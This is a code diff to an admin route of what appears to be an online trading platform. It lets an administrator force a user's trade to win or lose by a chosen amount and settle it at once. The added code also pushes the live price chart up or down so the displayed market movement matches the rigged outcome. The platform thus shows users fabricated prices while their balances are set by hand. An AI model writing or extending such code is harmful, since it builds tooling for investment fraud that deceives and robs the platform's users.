@@ -920,49 +920,71 @@ router.put(
     if (req.body.outcome === "clear") {
       trade.forcedOutcome = null;
       trade.forcedAmount = null;
-    } else {
-      trade.forcedOutcome = req.body.outcome;
-      if (
-        req.body.amount != null &&
-        req.body.amount !== "" &&
-        Number.isFinite(Number(req.body.amount))
-      ) {
-        // Signed Manual Balance Add — keep sign (e.g. 125 or -175), never clamp to %
-        trade.forcedAmount = Number(req.body.amount);
-      } else if (trade.forcedAmount == null) {
-        return res.status(422).json({
-          success: false,
-          error: "ValidationError",
-          message:
-            "Enter Manual Balance Add amount (e.g. 125 for WIN profit, -175 for LOSS).",
-        });
-      }
-    }
-
-    await trade.save();
-
-    // If already expired, settle immediately with the forced outcome
-    if (
-      trade.forcedOutcome &&
-      Date.now() >= new Date(trade.expiresAt).getTime()
-    ) {
-      const settled = await settleTrade(trade._id);
+      await trade.save();
       return res.json({
         success: true,
-        message: `Trade settled as ${settled.status}.`,
-        trade: serializeAdminTrade(settled),
+        message: "Forced outcome cleared.",
+        trade: serializeAdminTrade(trade),
       });
     }
 
-    res.json({
+    trade.forcedOutcome = req.body.outcome;
+    if (
+      req.body.amount != null &&
+      req.body.amount !== "" &&
+      Number.isFinite(Number(req.body.amount))
+    ) {
+      trade.forcedAmount = Number(req.body.amount);
+    } else if (trade.forcedAmount == null) {
+      return res.status(422).json({
+        success: false,
+        error: "ValidationError",
+        message:
+          "Enter Manual Balance Add amount (e.g. 25). Final WIN credit = stake + this amount.",
+      });
+    }
+
+    // Push live chart HIGH on Force WIN / LOW on Force LOSS
+    if (req.body.outcome === "win") {
+      trade.priceBiasPercent = Math.max(
+        Number(trade.priceBiasPercent || 0),
+        2.5
+      );
+    } else {
+      trade.priceBiasPercent = Math.min(
+        Number(trade.priceBiasPercent || 0),
+        -2.5
+      );
+    }
+
+    // Expire now so settle runs immediately with exact Manual Balance Add
+    trade.expiresAt = new Date();
+    await trade.save();
+
+    const settled = await settleTrade(trade._id);
+    const owner = await User.findById(trade.user);
+    const wallet =
+      owner?.wallet instanceof Map
+        ? Object.fromEntries(owner.wallet)
+        : { ...(owner?.wallet || {}) };
+
+    const add = Math.abs(Number(settled.forcedAmount || 0));
+    const msg =
+      settled.status === "won"
+        ? `Force WIN settled · credited $${Number(settled.payout || 0).toFixed(
+            2
+          )} (stake $${Number(settled.stake).toFixed(2)} + add $${add.toFixed(
+            2
+          )}). Wallet USDT now $${Number(wallet.USDT || 0).toFixed(2)}.`
+        : `Force LOSS settled · deducted add $${add.toFixed(
+            2
+          )}. Wallet USDT now $${Number(wallet.USDT || 0).toFixed(2)}.`;
+
+    return res.json({
       success: true,
-      message:
-        req.body.outcome === "clear"
-          ? "Forced outcome cleared."
-          : `Forced ${req.body.outcome} · Manual Balance Add $${Number(
-              trade.forcedAmount || 0
-            ).toFixed(2)} (not %).`,
-      trade: serializeAdminTrade(trade),
+      message: msg,
+      trade: serializeAdminTrade(settled),
+      wallet,
     });
   })
 );
@@ -998,7 +1020,7 @@ router.put(
       });
     }
 
-    const step = Number(req.body.step) || 0.35;
+    const step = Number(req.body.step) || 2;
     if (req.body.direction === "reset") {
       trade.priceBiasPercent = 0;
     } else if (req.body.direction === "up") {
@@ -1013,6 +1035,7 @@ router.put(
     if (user) {
       if (!user.chartBias) user.chartBias = new Map();
       const cur = Number(user.chartBias.get(trade.asset) || 0);
+      const step = Number(req.body.step) || 2;
       if (req.body.direction === "reset") {
         user.chartBias.set(trade.asset, 0);
       } else if (req.body.direction === "up") {
